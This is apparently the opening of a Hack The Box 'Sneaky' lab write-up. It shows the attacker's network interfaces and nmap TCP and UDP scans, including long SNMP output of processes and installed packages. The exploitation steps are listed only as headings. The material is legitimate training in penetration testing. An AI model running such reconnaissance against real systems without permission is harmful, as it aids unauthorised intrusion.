#### Sneaky

- [Attacker Info]()
- [Nmap Scan]()
- [Gobuster]()
- [HTTP Enumeration]()
- [SQLmap]()
- [IPv6]()
- [Method 1 - Hopping on the htb network]()
- [Method 2 - Enumerating Networks by pinging Multicast]()
- [SNMP Enumeration]()
- [Privilege Escalation using buffer overflow]()

###### Attacker Info

```sh
root@kali:~/sneaky# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.8/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
       valid_lft 85912sec preferred_lft 85912sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100e/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::1e1:6f9f:867b:5d8d/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.8  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:feb0:a919  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:b0:a9:19  txqueuelen 1000  (Ethernet)
        RX packets 265582  bytes 76474055 (72.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 382567  bytes 52057814 (49.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 312  bytes 77670 (75.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 312  bytes 77670 (75.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.16  netmask 255.255.254.0  destination 10.10.14.16
        inet6 dead:beef:2::100e  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::1e1:6f9f:867b:5d8d  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 252402  bytes 41352609 (39.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 378147  bytes 26386218 (25.1 MiB)
        TX errors 0  dropped 85 overruns 0  carrier 0  collisions 0

root@kali:~/sneaky#
```

###### Nmap Scan

```sh
root@kali:~/sneaky# nmap -sV -sC -oA sneaky.nmap 10.10.10.20
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-06 14:38 EDT
Nmap scan report for 10.10.10.20
Host is up (0.20s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds
root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# nmap -sU -T4 -A -v 10.10.10.20
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-06 16:09 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:09
Completed NSE at 16:09, 0.00s elapsed
Initiating NSE at 16:09
Completed NSE at 16:09, 0.00s elapsed
Initiating Ping Scan at 16:09
Scanning 10.10.10.20 [4 ports]
Completed Ping Scan at 16:09, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:09
Completed Parallel DNS resolution of 1 host. at 16:09, 0.01s elapsed
Initiating UDP Scan at 16:09
Scanning 10.10.10.20 [1000 ports]
Increasing send delay for 10.10.10.20 from 0 to 50 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.10.20 from 50 to 100 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.10.20 from 100 to 200 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.10.20 from 200 to 400 due to max_successful_tryno increase to 6
Warning: 10.10.10.20 giving up on port because retransmission cap hit (6).
UDP Scan Timing: About 5.83% done; ETC: 16:18 (0:08:21 remaining)
Increasing send delay for 10.10.10.20 from 400 to 800 due to 11 out of 23 dropped probes since last increase.
UDP Scan Timing: About 9.11% done; ETC: 16:20 (0:10:08 remaining)
UDP Scan Timing: About 12.01% done; ETC: 16:21 (0:11:06 remaining)
UDP Scan Timing: About 16.49% done; ETC: 16:23 (0:11:44 remaining)
UDP Scan Timing: About 28.40% done; ETC: 16:24 (0:11:01 remaining)
UDP Scan Timing: About 35.71% done; ETC: 16:25 (0:10:12 remaining)
UDP Scan Timing: About 41.81% done; ETC: 16:25 (0:09:21 remaining)
UDP Scan Timing: About 47.53% done; ETC: 16:25 (0:08:31 remaining)
UDP Scan Timing: About 53.39% done; ETC: 16:25 (0:07:39 remaining)
UDP Scan Timing: About 58.66% done; ETC: 16:25 (0:06:49 remaining)
UDP Scan Timing: About 64.06% done; ETC: 16:25 (0:05:57 remaining)
UDP Scan Timing: About 69.46% done; ETC: 16:25 (0:05:05 remaining)
UDP Scan Timing: About 74.87% done; ETC: 16:25 (0:04:12 remaining)
UDP Scan Timing: About 79.97% done; ETC: 16:26 (0:03:22 remaining)
Discovered open port 161/udp on 10.10.10.20
UDP Scan Timing: About 85.33% done; ETC: 16:26 (0:02:28 remaining)
UDP Scan Timing: About 90.34% done; ETC: 16:26 (0:01:38 remaining)
UDP Scan Timing: About 95.53% done; ETC: 16:26 (0:00:45 remaining)
Completed UDP Scan at 16:27, 1070.81s elapsed (1000 total ports)
Initiating Service scan at 16:27
Scanning 9 services on 10.10.10.20
Service scan Timing: About 22.22% done; ETC: 16:31 (0:03:27 remaining)
Completed Service scan at 16:28, 64.32s elapsed (9 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.20
Retrying OS detection (try #2) against 10.10.10.20
Initiating Traceroute at 16:28
Completed Traceroute at 16:28, 0.18s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 16:28
Completed Parallel DNS resolution of 2 hosts. at 16:28, 0.02s elapsed
NSE: Script scanning 10.10.10.20.
Initiating NSE at 16:28
Completed NSE at 16:36, 514.48s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 1.01s elapsed
Nmap scan report for 10.10.10.20
Host is up (0.18s latency).
Not shown: 991 closed ports
PORT      STATE         SERVICE    VERSION
161/udp   open          snmp       SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: fcf2da02d0831859
|   snmpEngineBoots: 8
|_  snmpEngineTime: 2d18h01m46s
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 454.72 Kb sent, 454.72 Kb received
|   eth0
|     IP address: 10.10.10.20  Netmask: 255.255.255.0
|     MAC address: 00:50:56:8f:d7:6e (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 157.81 Mb sent, 115.72 Mb received
| snmp-netstat:
|   TCP  127.0.0.1:3306       0.0.0.0:0
|_  UDP  0.0.0.0:161          *:*
| snmp-processes:
|   1:
|     Name: init
|     Path: /sbin/init
|   403:
|     Name: upstart-udev-br
|     Path: upstart-udev-bridge
|     Params: --daemon
|   408:
|     Name: systemd-udevd
|     Path: /lib/systemd/systemd-udevd
|     Params: --daemon
|   451:
|     Name: dbus-daemon
|     Path: dbus-daemon
|     Params: --system --fork
|   479:
|     Name: systemd-logind
|     Path: /lib/systemd/systemd-logind
|   487:
|     Name: rsyslogd
|     Path: rsyslogd
|   510:
|     Name: upstart-file-br
|     Path: upstart-file-bridge
|     Params: --daemon
|   915:
|     Name: upstart-socket-
|     Path: upstart-socket-bridge
|     Params: --daemon
|   944:
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty4
|   947:
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty5
|   952:
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty2
|   953:
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty3
|   957:
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty6
|   989:
|     Name: sshd
|     Path: /usr/sbin/sshd
|     Params: -D
|   991:
|     Name: atd
|     Path: atd
|   992:
|     Name: cron
|     Path: cron
|   994:
|     Name: acpid
|     Path: acpid
|     Params: -c /etc/acpi/events -s /var/run/acpid.socket
|   1045:
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|   1074:
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -Lsd -Lf /dev/null -u snmp -g snmp -I -smux mteTrigger mteTriggerConf -p /var/run/snmpd.pid
|   1091:
|     Name: vmtoolsd
|     Path: /usr/bin/vmtoolsd
|   1170:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1214:
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty1
|   4063:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4109:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4121:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4126:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4138:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4142:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4160:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4161:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4164:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4166:
|     Name: apache2
|     Path: /usr/sbin/apache2
|_    Params: -k start
| snmp-sysdescr: Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
|_  System uptime: 2d18h01m46.51s (23770651 timeticks)
| snmp-win32-software:
|   accountsservice-0.6.35-0ubuntu7.3; 0-01-01T00:00:00
|   acpid-1:2.0.21-1ubuntu2; 0-01-01T00:00:00
|   adduser-3.113+nmu3ubuntu3; 0-01-01T00:00:00
|   apache2-2.4.7-1ubuntu4.15; 0-01-01T00:00:00
|   apache2-bin-2.4.7-1ubuntu4.15; 0-01-01T00:00:00
|   apache2-data-2.4.7-1ubuntu4.15; 0-01-01T00:00:00
|   apparmor-2.10.95-0ubuntu2.6~14.04.1; 0-01-01T00:00:00
|   apport-2.14.1-0ubuntu3.23; 0-01-01T00:00:00
|   apport-symptoms-0.20; 0-01-01T00:00:00
|   apt-1.0.1ubuntu2.17; 0-01-01T00:00:00
|   apt-transport-https-1.0.1ubuntu2.17; 0-01-01T00:00:00
|   apt-utils-1.0.1ubuntu2.17; 0-01-01T00:00:00
|   apt-xapian-index-0.45ubuntu4; 0-01-01T00:00:00
|   aptitude-0.6.8.2-1ubuntu4; 0-01-01T00:00:00
|   aptitude-common-0.6.8.2-1ubuntu4; 0-01-01T00:00:00
|   at-3.1.14-1ubuntu1; 0-01-01T00:00:00
|   base-files-7.2ubuntu5.5; 0-01-01T00:00:00
|   base-passwd-3.5.33; 0-01-01T00:00:00
|   bash-4.3-7ubuntu1.6; 0-01-01T00:00:00
|   bash-completion-1:2.1-4ubuntu0.2; 0-01-01T00:00:00
|   bc-1.06.95-8ubuntu1; 0-01-01T00:00:00
|   bind9-host-1:9.9.5.dfsg-3ubuntu0.14; 0-01-01T00:00:00
|   binutils-2.24-5ubuntu14.2; 0-01-01T00:00:00
|   biosdevname-0.4.1-0ubuntu6.3; 0-01-01T00:00:00
|   bsdmainutils-9.0.5ubuntu1; 0-01-01T00:00:00
|   bsdutils-1:2.20.1-5.1ubuntu20.9; 0-01-01T00:00:00
|   busybox-initramfs-1:1.21.0-1ubuntu1; 0-01-01T00:00:00
|   busybox-static-1:1.21.0-1ubuntu1; 0-01-01T00:00:00
|   byobu-5.77-0ubuntu1.2; 0-01-01T00:00:00
|   bzip2-1.0.6-5; 0-01-01T00:00:00
|   ca-certificates-20160104ubuntu0.14.04.1; 0-01-01T00:00:00
|   command-not-found-0.3ubuntu12; 0-01-01T00:00:00
|   command-not-found-data-0.3ubuntu12; 0-01-01T00:00:00
|   console-setup-1.70ubuntu8; 0-01-01T00:00:00
|   coreutils-8.21-1ubuntu5.4; 0-01-01T00:00:00
|   cpio-2.11+dfsg-1ubuntu1.2; 0-01-01T00:00:00
|   cpp-4.8-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   cpp-4:4.8.2-1ubuntu6; 0-01-01T00:00:00
|   crda-1.1.2-1ubuntu2; 0-01-01T00:00:00
|   cron-3.0pl1-124ubuntu2; 0-01-01T00:00:00
|   curl-7.35.0-1ubuntu2.10; 0-01-01T00:00:00
|   dash-0.5.7-4ubuntu1; 0-01-01T00:00:00
|   dbus-1.6.18-0ubuntu4.5; 0-01-01T00:00:00
|   debconf-1.5.51ubuntu2; 0-01-01T00:00:00
|   debconf-i18n-1.5.51ubuntu2; 0-01-01T00:00:00
|   debianutils-4.4; 0-01-01T00:00:00
|   dh-python-1.20140128-1ubuntu8.2; 0-01-01T00:00:00
|   diffutils-1:3.3-1; 0-01-01T00:00:00
|   dmidecode-2.12-2; 0-01-01T00:00:00
|   dmsetup-2:1.02.77-6ubuntu2; 0-01-01T00:00:00
|   dnsutils-1:9.9.5.dfsg-3ubuntu0.14; 0-01-01T00:00:00
|   dosfstools-3.0.26-1ubuntu0.1; 0-01-01T00:00:00
|   dpkg-1.17.5ubuntu5.7; 0-01-01T00:00:00
|   e2fslibs-1.42.9-3ubuntu1.3; 0-01-01T00:00:00
|   e2fsprogs-1.42.9-3ubuntu1.3; 0-01-01T00:00:00
|   ed-1.9-2; 0-01-01T00:00:00
|   eject-2.1.5+deb1+cvs20081104-13.1ubuntu0.14.04.1; 0-01-01T00:00:00
|   ethtool-1:3.13-1; 0-01-01T00:00:00
|   file-1:5.14-2ubuntu3.3; 0-01-01T00:00:00
|   findutils-4.4.2-7; 0-01-01T00:00:00
|   fonts-ubuntu-font-family-console-0.80-0ubuntu6; 0-01-01T00:00:00
|   friendly-recovery-0.2.25; 0-01-01T00:00:00
|   ftp-0.17-28; 0-01-01T00:00:00
|   fuse-2.9.2-4ubuntu4.14.04.1; 0-01-01T00:00:00
|   gawk-1:4.0.1+dfsg-2.1ubuntu2; 0-01-01T00:00:00
|   gcc-4.8-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   gcc-4.8-base-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   gcc-4.9-base-4.9.3-0ubuntu4; 0-01-01T00:00:00
|   gdb-7.7.1-0ubuntu5~14.04.2; 0-01-01T00:00:00
|   geoip-database-20140313-1; 0-01-01T00:00:00
|   gettext-base-0.18.3.1-1ubuntu3; 0-01-01T00:00:00
|   gir1.2-glib-2.0-1.40.0-1ubuntu0.2; 0-01-01T00:00:00
|   git-man-1:1.9.1-1ubuntu0.4; 0-01-01T00:00:00
|   gnupg-1.4.16-1ubuntu2.4; 0-01-01T00:00:00
|   gpgv-1.4.16-1ubuntu2.4; 0-01-01T00:00:00
|   grep-2.16-1; 0-01-01T00:00:00
|   groff-base-1.22.2-5; 0-01-01T00:00:00
|   grub-common-2.02~beta2-9ubuntu1.12; 0-01-01T00:00:00
|   grub-gfxpayload-lists-0.6; 0-01-01T00:00:00
|   grub-pc-2.02~beta2-9ubuntu1.12; 0-01-01T00:00:00
|   grub-pc-bin-2.02~beta2-9ubuntu1.12; 0-01-01T00:00:00
|   grub2-common-2.02~beta2-9ubuntu1.12; 0-01-01T00:00:00
|   gzip-1.6-3ubuntu1; 0-01-01T00:00:00
|   hdparm-9.43-1ubuntu3; 0-01-01T00:00:00
|   hostname-3.15ubuntu1; 0-01-01T00:00:00
|   ifupdown-0.7.47.2ubuntu4.4; 0-01-01T00:00:00
|   info-5.2.0.dfsg.1-2; 0-01-01T00:00:00
|   init-system-helpers-1.14ubuntu1; 0-01-01T00:00:00
|   initramfs-tools-0.103ubuntu4.7; 0-01-01T00:00:00
|   initramfs-tools-bin-0.103ubuntu4.7; 0-01-01T00:00:00
|   initscripts-2.88dsf-41ubuntu6.3; 0-01-01T00:00:00
|   insserv-1.14.0-5ubuntu2; 0-01-01T00:00:00
|   install-info-5.2.0.dfsg.1-2; 0-01-01T00:00:00
|   installation-report-2.54ubuntu1; 0-01-01T00:00:00
|   iproute2-3.12.0-2ubuntu1; 0-01-01T00:00:00
|   iptables-1.4.21-1ubuntu1; 0-01-01T00:00:00
|   iputils-ping-3:20121221-4ubuntu1.1; 0-01-01T00:00:00
|   iputils-tracepath-3:20121221-4ubuntu1.1; 0-01-01T00:00:00
|   irqbalance-1.0.6-2ubuntu0.14.04.4; 0-01-01T00:00:00
|   isc-dhcp-client-4.2.4-7ubuntu12.8; 0-01-01T00:00:00
|   isc-dhcp-common-4.2.4-7ubuntu12.8; 0-01-01T00:00:00
|   iso-codes-3.52-1; 0-01-01T00:00:00
|   kbd-1.15.5-1ubuntu1; 0-01-01T00:00:00
|   keyboard-configuration-1.70ubuntu8; 0-01-01T00:00:00
|   klibc-utils-2.0.3-0ubuntu1.14.04.2; 0-01-01T00:00:00
|   kmod-15-0ubuntu6; 0-01-01T00:00:00
|   krb5-locales-1.12+dfsg-2ubuntu5.3; 0-01-01T00:00:00
|   landscape-common-14.12-0ubuntu5.14.04; 0-01-01T00:00:00
|   language-pack-en-1:14.04+20160720; 0-01-01T00:00:00
|   language-pack-en-base-1:14.04+20160720; 0-01-01T00:00:00
|   language-selector-common-0.129.3; 0-01-01T00:00:00
|   laptop-detect-0.13.7ubuntu2; 0-01-01T00:00:00
|   less-458-2; 0-01-01T00:00:00
|   libaccountsservice0-0.6.35-0ubuntu7.3; 0-01-01T00:00:00
|   libacl1-2.2.52-1; 0-01-01T00:00:00
|   libaio1-0.3.109-4; 0-01-01T00:00:00
|   libapache2-mod-auth-mysql-4.3.9-13.1ubuntu3; 0-01-01T00:00:00
|   libapache2-mod-php5-5.5.9+dfsg-1ubuntu4.21; 0-01-01T00:00:00
|   libapparmor-perl-2.10.95-0ubuntu2.6~14.04.1; 0-01-01T00:00:00
|   libapparmor1-2.10.95-0ubuntu2.6~14.04.1; 0-01-01T00:00:00
|   libapr1-1.5.0-1; 0-01-01T00:00:00
|   libaprutil1-1.5.3-1; 0-01-01T00:00:00
|   libaprutil1-dbd-sqlite3-1.5.3-1; 0-01-01T00:00:00
|   libaprutil1-ldap-1.5.3-1; 0-01-01T00:00:00
|   libapt-inst1.5-1.0.1ubuntu2.17; 0-01-01T00:00:00
|   libapt-pkg4.12-1.0.1ubuntu2.17; 0-01-01T00:00:00
|   libarchive-extract-perl-0.70-1; 0-01-01T00:00:00
|   libasan0-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   libasn1-8-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   libasprintf0c2-0.18.3.1-1ubuntu3; 0-01-01T00:00:00
|   libatomic1-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   libattr1-1:2.4.47-1ubuntu1; 0-01-01T00:00:00
|   libaudit-common-1:2.3.2-2ubuntu1; 0-01-01T00:00:00
|   libaudit1-1:2.3.2-2ubuntu1; 0-01-01T00:00:00
|   libbind9-90-1:9.9.5.dfsg-3ubuntu0.14; 0-01-01T00:00:00
|   libblkid1-2.20.1-5.1ubuntu20.9; 0-01-01T00:00:00
|   libboost-iostreams1.54.0-1.54.0-4ubuntu3.1; 0-01-01T00:00:00
|   libbsd0-0.6.0-2ubuntu1; 0-01-01T00:00:00
|   libbz2-1.0-1.0.6-5; 0-01-01T00:00:00
|   libc-bin-2.19-0ubuntu6.11; 0-01-01T00:00:00
|   libc-dev-bin-2.19-0ubuntu6.11; 0-01-01T00:00:00
|   libc6-2.19-0ubuntu6.11; 0-01-01T00:00:00
|   libc6-dbg-2.19-0ubuntu6.11; 0-01-01T00:00:00
|   libc6-dev-2.19-0ubuntu6.11; 0-01-01T00:00:00
|   libcap-ng0-0.7.3-1ubuntu2; 0-01-01T00:00:00
|   libcap2-1:2.24-0ubuntu2; 0-01-01T00:00:00
|   libcap2-bin-1:2.24-0ubuntu2; 0-01-01T00:00:00
|   libcgmanager0-0.24-0ubuntu7.5; 0-01-01T00:00:00
|   libck-connector0-0.4.5-3.1ubuntu2; 0-01-01T00:00:00
|   libclass-accessor-perl-0.34-1; 0-01-01T00:00:00
|   libcloog-isl4-0.18.2-1; 0-01-01T00:00:00
|   libcomerr2-1.42.9-3ubuntu1.3; 0-01-01T00:00:00
|   libcurl3-7.35.0-1ubuntu2.10; 0-01-01T00:00:00
|   libcurl3-gnutls-7.35.0-1ubuntu2.10; 0-01-01T00:00:00
|   libcwidget3-0.5.16-3.5ubuntu1; 0-01-01T00:00:00
|   libdb5.3-5.3.28-3ubuntu3; 0-01-01T00:00:00
|   libdbd-mysql-perl-4.025-1ubuntu0.1; 0-01-01T00:00:00
|   libdbi-perl-1.630-1; 0-01-01T00:00:00
|   libdbus-1-3-1.6.18-0ubuntu4.5; 0-01-01T00:00:00
|   libdbus-glib-1-2-0.100.2-1; 0-01-01T00:00:00
|   libdebconfclient0-0.187ubuntu1; 0-01-01T00:00:00
|   libdevmapper1.02.1-2:1.02.77-6ubuntu2; 0-01-01T00:00:00
|   libdns100-1:9.9.5.dfsg-3ubuntu0.14; 0-01-01T00:00:00
|   libdrm2-2.4.67-1ubuntu0.14.04.1; 0-01-01T00:00:00
|   libdumbnet1-1.12-4build1; 0-01-01T00:00:00
|   libedit2-3.1-20130712-2; 0-01-01T00:00:00
|   libelf1-0.158-0ubuntu5.2; 0-01-01T00:00:00
|   libept1.4.12-1.0.12; 0-01-01T00:00:00
|   liberror-perl-0.17-1.1; 0-01-01T00:00:00
|   libestr0-0.1.9-0ubuntu2; 0-01-01T00:00:00
|   libevent-2.0-5-2.0.21-stable-1ubuntu1.14.04.2; 0-01-01T00:00:00
|   libexpat1-2.1.0-4ubuntu1.3; 0-01-01T00:00:00
|   libffi6-3.1~rc1+r3.0.13-12ubuntu0.1; 0-01-01T00:00:00
|   libfreetype6-2.5.2-1ubuntu2.8; 0-01-01T00:00:00
|   libfribidi0-0.19.6-1; 0-01-01T00:00:00
|   libfuse2-2.9.2-4ubuntu4.14.04.1; 0-01-01T00:00:00
|   libgc1c2-1:7.2d-5ubuntu2.1; 0-01-01T00:00:00
|   libgcc-4.8-dev-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   libgcc1-1:4.9.3-0ubuntu4; 0-01-01T00:00:00
|   libgck-1-0-3.10.1-1; 0-01-01T00:00:00
|   libgcr-3-common-3.10.1-1; 0-01-01T00:00:00
|   libgcr-base-3-1-3.10.1-1; 0-01-01T00:00:00
|   libgcrypt11-1.5.3-2ubuntu4.4; 0-01-01T00:00:00
|   libgdbm3-1.8.3-12build1; 0-01-01T00:00:00
|   libgeoip1-1.6.0-1; 0-01-01T00:00:00
|   libgirepository-1.0-1-1.40.0-1ubuntu0.2; 0-01-01T00:00:00
|   libglib2.0-0-2.40.2-0ubuntu1; 0-01-01T00:00:00
|   libglib2.0-data-2.40.2-0ubuntu1; 0-01-01T00:00:00
|   libgmp10-2:5.1.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libgnutls-openssl27-2.12.23-12ubuntu2.7; 0-01-01T00:00:00
|   libgnutls26-2.12.23-12ubuntu2.7; 0-01-01T00:00:00
|   libgomp1-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   libgpg-error0-1.12-0.2ubuntu1; 0-01-01T00:00:00
|   libgpm2-1.20.4-6.1; 0-01-01T00:00:00
|   libgssapi-krb5-2-1.12+dfsg-2ubuntu5.3; 0-01-01T00:00:00
|   libgssapi3-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   libhcrypto4-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   libheimbase1-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   libheimntlm0-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   libhtml-template-perl-2.95-1; 0-01-01T00:00:00
|   libhx509-5-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   libicu52-52.1-3ubuntu0.7; 0-01-01T00:00:00
|   libidn11-1.28-1ubuntu2.1; 0-01-01T00:00:00
|   libio-string-perl-1.08-3; 0-01-01T00:00:00
|   libisc95-1:9.9.5.dfsg-3ubuntu0.14; 0-01-01T00:00:00
|   libisccc90-1:9.9.5.dfsg-3ubuntu0.14; 0-01-01T00:00:00
|   libisccfg90-1:9.9.5.dfsg-3ubuntu0.14; 0-01-01T00:00:00
|   libisl10-0.12.2-1; 0-01-01T00:00:00
|   libitm1-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   libiw30-30~pre9-8ubuntu1; 0-01-01T00:00:00
|   libjson-c2-0.11-3ubuntu1.2; 0-01-01T00:00:00
|   libjson0-0.11-3ubuntu1.2; 0-01-01T00:00:00
|   libk5crypto3-1.12+dfsg-2ubuntu5.3; 0-01-01T00:00:00
|   libkeyutils1-1.5.6-1; 0-01-01T00:00:00
|   libklibc-2.0.3-0ubuntu1.14.04.2; 0-01-01T00:00:00
|   libkmod2-15-0ubuntu6; 0-01-01T00:00:00
|   libkrb5-26-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   libkrb5-3-1.12+dfsg-2ubuntu5.3; 0-01-01T00:00:00
|   libkrb5support0-1.12+dfsg-2ubuntu5.3; 0-01-01T00:00:00
|   libldap-2.4-2-2.4.31-1+nmu2ubuntu8.3; 0-01-01T00:00:00
|   liblocale-gettext-perl-1.05-7build3; 0-01-01T00:00:00
|   liblockfile-bin-1.09-6ubuntu1; 0-01-01T00:00:00
|   liblockfile1-1.09-6ubuntu1; 0-01-01T00:00:00
|   liblog-message-simple-perl-0.10-1; 0-01-01T00:00:00
|   liblwres90-1:9.9.5.dfsg-3ubuntu0.14; 0-01-01T00:00:00
|   liblzma5-5.1.1alpha+20120614-2ubuntu2; 0-01-01T00:00:00
|   libmagic1-1:5.14-2ubuntu3.3; 0-01-01T00:00:00
|   libmcrypt4-2.5.8-3.1ubuntu1; 0-01-01T00:00:00
|   libmodule-pluggable-perl-5.1-1; 0-01-01T00:00:00
|   libmount1-2.20.1-5.1ubuntu20.9; 0-01-01T00:00:00
|   libmpc3-1.0.1-1ubuntu1; 0-01-01T00:00:00
|   libmpdec2-2.4.0-6; 0-01-01T00:00:00
|   libmpfr4-3.1.2-1; 0-01-01T00:00:00
|   libmysqlclient18-5.5.55-0ubuntu0.14.04.1; 0-01-01T00:00:00
|   libncurses5-5.9+20140118-1ubuntu1; 0-01-01T00:00:00
|   libncursesw5-5.9+20140118-1ubuntu1; 0-01-01T00:00:00
|   libnewt0.52-0.52.15-2ubuntu5; 0-01-01T00:00:00
|   libnfnetlink0-1.0.1-2; 0-01-01T00:00:00
|   libnih-dbus1-1.0.3-4ubuntu25; 0-01-01T00:00:00
|   libnih1-1.0.3-4ubuntu25; 0-01-01T00:00:00
|   libnl-3-200-3.2.21-1ubuntu4; 0-01-01T00:00:00
|   libnl-genl-3-200-3.2.21-1ubuntu4; 0-01-01T00:00:00
|   libnuma1-2.0.9~rc5-1ubuntu3.14.04.2; 0-01-01T00:00:00
|   libp11-kit0-0.20.2-2ubuntu2; 0-01-01T00:00:00
|   libpam-cap-1:2.24-0ubuntu2; 0-01-01T00:00:00
|   libpam-modules-1.1.8-1ubuntu2.2; 0-01-01T00:00:00
|   libpam-modules-bin-1.1.8-1ubuntu2.2; 0-01-01T00:00:00
|   libpam-runtime-1.1.8-1ubuntu2.2; 0-01-01T00:00:00
|   libpam-systemd-204-5ubuntu20.24; 0-01-01T00:00:00
|   libpam0g-1.1.8-1ubuntu2.2; 0-01-01T00:00:00
|   libparse-debianchangelog-perl-1.2.0-1ubuntu1; 0-01-01T00:00:00
|   libparted0debian1-2.3-19ubuntu1.14.04.1; 0-01-01T00:00:00
|   libpcap0.8-1.5.3-2; 0-01-01T00:00:00
|   libpci3-1:3.2.1-1ubuntu5.1; 0-01-01T00:00:00
|   libpcre3-1:8.31-2ubuntu2.3; 0-01-01T00:00:00
|   libpcsclite1-1.8.10-1ubuntu1.1; 0-01-01T00:00:00
|   libperl5.18-5.18.2-2ubuntu1.1; 0-01-01T00:00:00
|   libpipeline1-1.3.0-1; 0-01-01T00:00:00
